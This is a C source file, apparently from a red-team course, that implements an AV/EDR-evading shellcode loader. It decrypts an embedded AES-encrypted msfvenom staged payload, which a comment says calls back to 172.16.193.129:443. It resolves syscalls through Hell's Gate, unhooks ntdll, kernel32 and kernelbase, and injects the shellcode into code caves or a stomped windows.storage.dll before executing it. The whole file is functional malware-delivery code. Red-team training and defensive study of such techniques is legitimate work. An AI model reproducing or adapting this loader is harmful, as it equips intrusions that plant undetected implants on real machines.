/*

 Red Team Operator course code template
 Module stomping

 author: reenz0h (twitter: @SEKTOR7net)

*/
#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "peb_structs.h"
#include "definitions.h"

#pragma comment (lib, "advapi32") 

//msfvenom staged payload -f raw then aes encrypted.  172.16.193.129 443 -> will not get flagged if i unhook these three libraries -> kernel32.dll, kernelbase, ntdll.dll
//these libs likely need to be unhooked b/c the 2nd stage payload makes use of some functions that are hooked, even tho the first stage gets by effortlessly and doesn't get picked up on a disk scan.
unsigned char payload[] = { 0x27, 0xe, 0x28, 0x6c, 0x89, 0xef, 0x45, 0x4, 0x43, 0xf7, 0x39, 0xcd, 0x9, 0x45, 0x14, 0x3b, 0xab, 0xa9, 0x63, 0x22, 0x4e, 0x5b, 0x9f, 0xa4, 0x3c, 0x97, 0x3d, 0xa8, 0xa8, 0x9a, 0x21, 0xae, 0x85, 0x70, 0x1c, 0xe5, 0xf0, 0x71, 0xfc, 0x61, 0xf7, 0xc2, 0xba, 0x31, 0x90, 0xdf, 0xee, 0xaf, 0x70, 0xe, 0x6a, 0xeb, 0xbf, 0xbd, 0xbc, 0x4c, 0xb8, 0xaf, 0xa0, 0x74, 0xab, 0xaf, 0xc5, 0x64, 0x9c, 0x41, 0x27, 0xa8, 0xc7, 0x86, 0x64, 0x31, 0xf7, 0xf2, 0x50, 0x4a, 0x8e, 0x3, 0xf2, 0x3a, 0x57, 0x3c, 0xc2, 0x3a, 0x8d, 0xaf, 0x2c, 0x7b, 0x1c, 0xf4, 0x9a, 0x8b, 0x28, 0x74, 0x9a, 0x4d, 0x5b, 0x8d, 0xb5, 0x1b, 0x68, 0xc1, 0x61, 0xea, 0xd1, 0x44, 0x3, 0xb8, 0x75, 0x7, 0xa5, 0x1, 0x7c, 0x7, 0x91, 0x60, 0x68, 0x82, 0xa5, 0xd6, 0x8f, 0x3d, 0x64, 0x1f, 0x98, 0x44, 0x49, 0xe9, 0x42, 0x2d, 0x7a, 0xb7, 0xee, 0xc0, 0x20, 0xe8, 0x1e, 0x32, 0x7e, 0x33, 0x18, 0xbc, 0xcf, 0x7e, 0x72, 0x26, 0x5a, 0x6c, 0xb3, 0xc4, 0x65, 0x0, 0x99, 0x58, 0x6e, 0x16, 0xab, 0xa4, 0x26, 0xe7, 0x8e, 0xc9, 0x8c, 0x13, 0x19, 0xef, 0xc2, 0x19, 0xe6, 0x7e, 0xd0, 0xda, 0x4b, 0xe7, 0x89, 0x87, 0x1b, 0x88, 0x16, 0x79, 0xd1, 0xa3, 0x9a, 0xd0, 0x89, 0xf9, 0xde, 0xe4, 0x68, 0x54, 0xd3, 0xab, 0xb0, 0xca, 0xa5, 0x74, 0xe2, 0x6f, 0xa, 0x6e, 0xbe, 0x2a, 0x1b, 0xfd, 0x40, 0x2, 0x6a, 0xe2, 0x3d, 0x8a, 0xf8, 0xac, 0xd2, 0x2, 0x15, 0x43, 0xb4, 0xe4, 0x8, 0x92, 0x9e, 0xfc, 0x9c, 0x52, 0x51, 0x0, 0xd1, 0x7f, 0x8d, 0x19, 0xe8, 0x61, 0x79, 0x4d, 0x6e, 0x90, 0xa6, 0x4c, 0x30, 0x10, 0x9b, 0x32, 0xe8, 0xda, 0x99, 0x72, 0x16, 0xd0, 0xbb, 0xb5, 0x1d, 0x30, 0xa7, 0x6c, 0x91, 0xd4, 0x51, 0x53, 0x3a, 0x4c, 0xdc, 0xb6, 0x8e, 0x37, 0xf0, 0x49, 0xcd, 0x6c, 0xda, 0x22, 0x5f, 0x17, 0x4d, 0x5b, 0xa6, 0xb8, 0x79, 0xcc, 0x8e, 0x6e, 0xfc, 0x29, 0x16, 0xdd, 0x2f, 0x88, 0x33, 0xf3, 0xbc, 0x99, 0xd0, 0xc5, 0x7d, 0x17, 0x5e, 0x1f, 0xc9, 0x2, 0xae, 0x55, 0x68, 0x7b, 0xfd, 0x4d, 0x49, 0xa6, 0x76, 0x84, 0x27, 0x95, 0x47, 0xee, 0xb6, 0x9c, 0x7d, 0xd3, 0x5e, 0x35, 0x7d, 0x67, 0x55, 0x68, 0x67, 0x9, 0x6e, 0x2b, 0xe2, 0x6a, 0xf6, 0xe0, 0xd4, 0xbe, 0xda, 0xca, 0x36, 0x7f, 0x23, 0x13, 0xa4, 0x7c, 0x26, 0xea, 0xf3, 0x44, 0xe5, 0x6f, 0x27, 0x92, 0x1c, 0xf8, 0xd5, 0xc7, 0x13, 0xfa, 0xe1, 0x31, 0xe8, 0xac, 0xa1, 0xc2, 0x54, 0x38, 0xe7, 0x3, 0xe9, 0x77, 0x9e, 0xf4, 0x23, 0xe5, 0x52, 0x96, 0xf, 0x90, 0x2f, 0xce, 0x4b, 0xa7, 0x4c, 0xc2, 0xc2, 0x57, 0xdd, 0x11, 0xd0, 0x19, 0x39, 0x35, 0x86, 0x98, 0x47, 0xd2, 0xa8, 0x6a, 0x6c, 0x5d, 0x8f, 0x88, 0xdd, 0x41, 0x0, 0xf7, 0x97, 0x4b, 0xc0, 0x7d, 0x4a, 0xbb, 0xe, 0xc7, 0x21, 0x72, 0x41, 0x4d, 0xe9, 0x89, 0x3e, 0x59, 0x2a, 0x25, 0x33, 0xe7, 0xe8, 0x1b, 0xd8, 0xf0, 0x6, 0x75, 0x67, 0xea, 0xde, 0x29, 0xe5, 0x9d, 0x53, 0x63, 0x87, 0x99, 0x96, 0xbf, 0x4c, 0x53, 0x1, 0x95, 0xe5, 0xca, 0x70, 0x72, 0xb9, 0x47, 0xdd, 0x6d, 0xd3, 0xb6, 0xc1, 0xd9, 0x3a, 0x81, 0xb4, 0x4f, 0xf8, 0x5e, 0xa4, 0x5c, 0xdf, 0x7f, 0xc5, 0x2d, 0x1e, 0xa9, 0xad, 0xbd, 0x64, 0x8d, 0x23, 0xb8, 0x8a, 0x4d, 0x8b, 0xe, 0x2a, 0x98, 0xc3, 0x90, 0x73, 0xbc, 0x10, 0x54, 0x21, 0xb0, 0x5e, 0x29, 0x15, 0xf5, 0xb2, 0x3, 0xf5, 0x18, 0x82, 0xb5, 0xf3, 0xf8, 0x21, 0x5, 0xf6, 0x44, 0x5e, 0xab, 0xa4, 0x1b, 0xec, 0x42, 0xf5, 0x80, 0x3f, 0x6e, 0xf4, 0xfb, 0xd3, 0x36, 0x6, 0x12, 0x4d, 0x5a, 0x1d, 0x66, 0x45, 0x4c, 0x1e, 0x9b, 0x58, 0xae, 0xde, 0xbd, 0x76, 0x29, 0x83, 0x4c, 0xd2, 0x68, 0x1e, 0x8b, 0x13, 0xd4, 0x36, 0x4f, 0x58, 0x37, 0xd5, 0xae, 0x2c, 0x8f, 0x2c, 0xdc, 0xbf, 0xbe, 0x4e, 0x8c, 0x0, 0x57, 0x2e, 0xb2, 0x72, 0xfd, 0x94, 0x56, 0x8f, 0x2b, 0x41, 0x53, 0x94, 0x73, 0x67, 0x15, 0xcb, 0x2a, 0x1f, 0xf0, 0x12, 0xe6, 0xdf, 0x87, 0xbc, 0x6c, 0x59, 0x9, 0x6c, 0xf, 0x15, 0x75, 0xbd, 0xa3, 0xc8, 0x11, 0x71, 0xfc, 0x56, 0x4b, 0x9c, 0xa8, 0x29, 0x8, 0x3c, 0x53, 0x50, 0xf0, 0xb5, 0x15, 0x35, 0x33, 0xa, 0x59, 0x7e, 0x42, 0x19, 0xc2, 0xcc, 0xb, 0xc4, 0x42, 0xc2, 0xf3, 0xd4, 0x67, 0xb8, 0xaf, 0x88, 0x49, 0x3c, 0x9c, 0x7c, 0x33, 0x77, 0x71, 0xa0, 0xfd, 0x91, 0x5a, 0x7, 0x87, 0x4b, 0x9b, 0x4e, 0x2f, 0xed, 0xc6, 0xc2, 0xee, 0xbb, 0x16, 0x79, 0x1a, 0x5c, 0xdd, 0x3c, 0xa3, 0x6f, 0x96, 0x72, 0x2e, 0x9c, 0x3f, 0x7f, 0xd9, 0xa6, 0xd2, 0x8e, 0x97, 0x7b, 0x94, 0xbb, 0xd0, 0xbd, 0xeb, 0xcf, 0xe9, 0xcb, 0xa3, 0x32, 0xac, 0x4c, 0x98, 0x70, 0xf7, 0xdc, 0x69, 0xfa, 0x7e }; 
unsigned char key[] = { 0xa, 0x39, 0xb1, 0xe4, 0x47, 0xba, 0xfe, 0x3c, 0x88, 0x78, 0x9c, 0xaf, 0x80, 0x3, 0xc2, 0x3b };


SIZE_T payload_len = sizeof(payload);

int AESDecrypt(char* payload, unsigned int payload_len, char* key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
		return -1;
	}
	if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {
		return -1;
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
		return -1;
	}

	if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)payload, (DWORD*)&payload_len)) {
		return -1;
	}

	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);

	return 0;
}


void PopulateVxTable(PVX_TABLE table, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PLDR_DATA_TABLE_ENTRY pLdrDataEntry) {

	//populate api hashes in table.
	table->NtAllocateVirtualMemory.dwHash = 0xf5bd373480a6b89b;
	table->NtCreateThreadEx.dwHash = 0x64dc7db288c5015f;
	table->NtProtectVirtualMemory.dwHash = 0x858bcb1046fb6a37;
	table->NtWaitForSingleObject.dwHash = 0xc6a2fa174e551bcb;
	table->NtQueryVirtualMemory.dwHash = 0x683158f59618ee0c;
	table->NtOpenProcess.dwHash = 0x718CCA1F5291F6E7;
	table->NtOpenFile.dwHash = 0x4A063563C4387908;
	table->NtCreateSection.dwHash = 0xF38A8F71AF24371F;
	table->NtMapViewOfSection.dwHash = 0xF037C7B73290C159;
	table->NtReadFile.dwHash = 0x4A06357E3033C3D2;
	table->NtCreateFile.dwHash = 0xE4672568EEF00D8A;

	//9618ee0c
	//0xffffffff9618ee0c
	//0x683158f59618ee0c

	//retieve api locations & syscalls and populate them in the table
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &table->NtAllocateVirtualMemory))
		return -1;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &table->NtCreateThreadEx))
		return -1;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &table->NtProtectVirtualMemory))
		return -1;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &table->NtWaitForSingleObject))
		return -1;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &table->NtQueryVirtualMemory))
		return -1;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &table->NtOpenProcess))
		return -1;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &table->NtOpenFile))
		return -1;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &table->NtCreateSection))
		return -1;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &table->NtMapViewOfSection))
		return -1;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &table->NtReadFile))
		return -1;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &table->NtCreateFile))
		return -1;
}

//returns a handle to the current process using NtOpenProcess syscall and the hellsgate / hells decent function.
	//don't need this function to obtain handle to the current process.
	//HANDLE currProcHandle = GetCurrProcessHandle(table);
HANDLE GetCurrProcessHandle(PVX_TABLE table) {
	//open a handle to the current process.
	HANDLE currProcess = NULL;
	OBJECT_ATTRIBUTES objAttrs = { 0 };
	CLIENT_ID cID;
	cID.UniqueThread = NULL;
	DWORD dwProcessId = GetCurrentProcessId();
	cID.UniqueProcess = ULongToHandle(dwProcessId);

	NTSTATUS status = 0x00000000;
	HellsGate(table->NtOpenProcess.wSystemCall);
	status = HellDescent(&currProcess,
		 PROCESS_QUERY_INFORMATION,
		&objAttrs, &cID);

	return currProcess;
}

//finds a valid place for us to inject our shellcode into. It will search for a code cave "00000000" area in a preloaded module
//this prevents the loading of a new module and will not overwrite memory spaces.
//
int FindCodeCaves(PLDR_DATA_TABLE_ENTRY Module, PCC_OBJECT CodeCave, int ShellCodeSize, PVX_TABLE table) {
	DWORD i = 0;
	//Create a Really Long Egg
	BYTE pattern[] = "\x00\x00\x00\x00\x00\x00\x00\x00";
	BYTE patt[] = "\x00";

	//Num Caves
	DWORD CaveCounter = 0;
	//Start for loop at 0 until we're at the end of the image.
	for (i = 0; i < Module->SizeOfImage - 8; i++) {
		//Compare our egg and our DllBase + offset (i), if a match is found continue, otherwise offset += 1
		if (!memcmp((char *)Module->DllBase + i, pattern, 8)) {
			//create a second offset variable for determining cave size.
			DWORD x = 0;
			//create variable to store size.
			DWORD64 size = 0;
			//start second loop that will loop through our entire cave using start of the cave (DLLBase + i) and our current cave offset (x),
			//loop stops if the byte read is not 00 (end of cave) or we reach end of image (Module->SizeOfImage -1)
			while (!memcmp((char*)Module->DllBase + i + x, patt, 1) && (i + x < (Module->SizeOfImage - 1))) {
				size += 1;
				x += 1;
			}
			
			//Only save locations that are greater or equal to our payload size
			if (size >= ShellCodeSize) {
				//Only save locations that are memory regions with execute permissions, so we can simply change it back to the previous page protection.
				ULONG protection = QueryMemoryProtections(table, Module, i);
				if (protection == 0x10 || protection == 0x20 || protection == 0x40 || protection == 0x80 && !(protection | PAGE_NOACCESS)) {
					//save and then increment num of caves found.
					CodeCave->Size = size;
					CodeCave->pAddress = (char*)Module->DllBase + i;
					CodeCave->offset = i;
					CodeCave->protection = protection;
					CaveCounter += 1;
					break;
				}
			}
			i += size;
		}
	}
	//return num of caves found.
	return CaveCounter;
}


//Query memory protections of a targeted region. Will Return the protection value read.
ULONG QueryMemoryProtections(PVX_TABLE table, PLDR_DATA_TABLE_ENTRY Module, int i) {
	NTSTATUS status = 0x00000000;
	MEMORY_BASIC_INFORMATION mbi = { 0 };
	
	HellsGate(table->NtQueryVirtualMemory.wSystemCall);
	status = HellDescent((HANDLE)-1,(char *)Module->DllBase + i, NULL, &mbi, sizeof(mbi), NULL);

	return mbi.Protect;
}

//injects shellcode using previously resolved syscalls and the hellsgate/decent functions.
BOOL InjectShellCode(PCC_OBJECT CodeCave, PVX_TABLE table) {

	//printf("code cave address %p\n", CodeCave->pAddress);

	NTSTATUS status = 0x00000000;
	HANDLE u32 = LoadLibraryA("User32.dll");
	//We need to create a new pointer to our code cave b/c the call to NtProtectVirtualMemory will return the virtual address page of that region which is an issue.
	PVOID CodeCaveAddr = NULL;
	memcpy(&CodeCaveAddr, &CodeCave->pAddress, sizeof(CodeCaveAddr));
	//0x00007ffe3344a592
	//getchar();

	// Change page permissions for the targeted code cave
	ULONG ulOldProtect = 0;
	HellsGate(table->NtProtectVirtualMemory.wSystemCall);
	status = HellDescent((HANDLE)-1, &CodeCaveAddr, &payload_len, PAGE_READWRITE, &ulOldProtect);
		
	//printf("Code Cave Protections Made Read Write\n");

	//inject targeted shellcode
	VxMoveMemory(CodeCave->pAddress, payload, sizeof(payload));
	//memcpy(CodeCaveAddr, payload, payload_len);

	//printf("Code Cave should be filled with shellcode\n");// getchar();

	//Change protections back to execute read
	ULONG ulNewProtect = 0;
	memcpy(&CodeCaveAddr, &CodeCave->pAddress, sizeof(CodeCaveAddr));
	HellsGate(table->NtProtectVirtualMemory.wSystemCall);
	status = HellDescent((HANDLE)-1, &CodeCaveAddr, &payload_len, CodeCave->protection, &ulNewProtect);

	//printf("Code Cave should now be execute read again... executing\n");

	//Create thread
	HANDLE hHostThread = INVALID_HANDLE_VALUE;
	HellsGate(table->NtCreateThreadEx.wSystemCall);
	status = HellDescent(&hHostThread, 0x1FFFFF, NULL, (HANDLE)-1, (LPTHREAD_START_ROUTINE)CodeCave->pAddress, NULL, FALSE, NULL, NULL, NULL, NULL);

	//Wait for 1 second
	LARGE_INTEGER Timeout;
	Timeout.QuadPart = -10000000;
	//Timeout.QuadPart = 0xFFFFFFFF;
	HellsGate(table->NtWaitForSingleObject.wSystemCall);
	//status = HellDescent(hHostThread, FALSE, &Timeout);
	status = HellDescent(hHostThread, FALSE, NULL);

	return TRUE;
	
}

BOOL InjectSCModuleStomp(HMODULE hVictimLib, VX_TABLE table) {
	NTSTATUS status = 0;
	if (hVictimLib != NULL) {

		HANDLE u32 = LoadLibraryA("User32.dll");
		//char * ptr = (char *) VirtualAlloc(NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		//PVOID ptr = NULL;
		DWORD oldprotect = 0;
		char * ptr = (char*)hVictimLib + 2 * 4096 + 12;
		SIZE_T len = NULL;
		memcpy(&len, &payload_len, sizeof(len));
		PVOID changeablePtr = 0;
		memcpy(&changeablePtr, &ptr, sizeof(changeablePtr));
		HellsGate(table.NtProtectVirtualMemory.wSystemCall);
		status = HellDescent((HANDLE)-1, &changeablePtr, &len, PAGE_READWRITE, &oldprotect);

		DWORD outSize = 0;
		VxMoveMemory(ptr, payload, payload_len);

		// restore previous memory protection settings
		HellsGate(table.NtProtectVirtualMemory.wSystemCall);
		status = HellDescent((HANDLE)-1, &changeablePtr, &payload_len, oldprotect, &oldprotect);

		// launch shellcode by creating function pointer, calls shellcode w/o spawning a new thread.
		void (*go)() = (void (*)()) ptr; go();

		// launch shellcode by creating a new thread.
		//HANDLE hHostThread = INVALID_HANDLE_VALUE;
		//HellsGate(table.NtCreateThreadEx.wSystemCall);
		//status = HellDescent(&hHostThread, 0x1FFFFF, NULL, (HANDLE)-1, (LPTHREAD_START_ROUTINE)ptr, NULL, FALSE, NULL, NULL, NULL, NULL);

		//Wait for 1 second
		//LARGE_INTEGER Timeout;
		//Timeout.QuadPart = -10000000;
		//Timeout.QuadPart = 0xFFFFFFFF;
		//HellsGate(table.NtWaitForSingleObject.wSystemCall);
		//status = HellDescent(hHostThread, FALSE, &Timeout);
		//status = HellDescent(hHostThread, FALSE, 0);
	}
}

//This function obtains a pointer to the TEB using the GS register + 48 bytes (30 hex)
//then using the TEB we obtain a pointer to the PEB and return that value.
PPEB GetPointerToPEB() {
	PTEB pTEB = RtlGetThreadEnvironmentBlock();
	PPEB pPEB = pTEB->ProcessEnvironmentBlock;
	if (!pTEB || !pPEB || pPEB->OSMajorVersion != 0xA) {
		return -1;
	}
	return pPEB;
}

void ShellCodeInjectionViaBreadManModuleStomping(VX_TABLE table, PLDR_DATA_TABLE_ENTRY pLdrDataEntry) {
	
	
	//Decrypt our payload
	AESDecrypt(payload, payload_len, key, sizeof(key));
	SIZE_T maxSize = 0x00004000;
	//Find Code Caves for target Module Retrieved from PEB
	if (payload_len < maxSize) {
		//Create Array of Code Cave Entries
		CC_OBJECT CodeCave = { 0 };

		int NumCaves = FindCodeCaves(pLdrDataEntry, &CodeCave, payload_len, &table);

		//for (int i = 0; i < NumCaves; i++) {
		//	printf("Code Cave Located At : % p with a size of % d\n", CodeCaves[i].pAddress, (int)CodeCaves[i].Size);
		//}
		//getchar();

		InjectShellCode(&CodeCave, &table);
	}
	else {
		unsigned char sLib[] = { 'w','i','n','d','o','w','s','.','s','t','o','r','a','g','e','.','d','l','l', 0x0 };
		HMODULE hVictimLib = LoadLibraryA((LPCSTR)sLib);
		InjectSCModuleStomp(hVictimLib, table);
	}
	return;
}


int main(void) {
	//ShowWindow(GetConsoleWindow(), SW_HIDE);
	
	//obtain pointer to PEB.
	PPEB pPEB = GetPointerToPEB();

	// Get NTDLL module 
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPEB->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);

	//Get EAT Table
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
		return -1;
	//Create VXTable
	VX_TABLE table = { 0 };

	//Populate its entries
	PopulateVxTable(&table, pImageExportDirectory, pLdrDataEntry);
	
	UnhookingMainFunction(&table);
	ShellCodeInjectionViaBreadManModuleStomping(table, pLdrDataEntry);
	return 0;
}